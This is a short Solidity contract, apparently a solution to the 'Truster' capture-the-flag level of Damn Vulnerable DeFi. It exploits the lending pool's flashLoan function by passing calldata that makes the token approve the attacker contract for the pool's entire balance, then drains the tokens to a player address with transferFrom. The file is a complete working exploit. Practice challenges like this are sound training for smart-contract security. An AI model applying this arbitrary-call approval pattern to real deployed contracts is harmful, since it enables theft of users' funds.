// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "../DamnValuableToken.sol";

contract trusterAttack {
    TrusterLenderPool truster;
    DamnValuableToken token;
    uint state;

    constructor(address _truster, address _token) {
        truster = TrusterLenderPool(_truster);
        token = DamnValuableToken(_token);
    }

    function getGas() public view returns (uint) {
        return gasleft();
    }

    function attack(address player) public {
        address target = address(token);
        uint balance = token.balanceOf(address(truster));
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            balance
        );

        truster.flashLoan(0, target, target, data);
        token.transferFrom(address(truster), player, balance);
    }
}
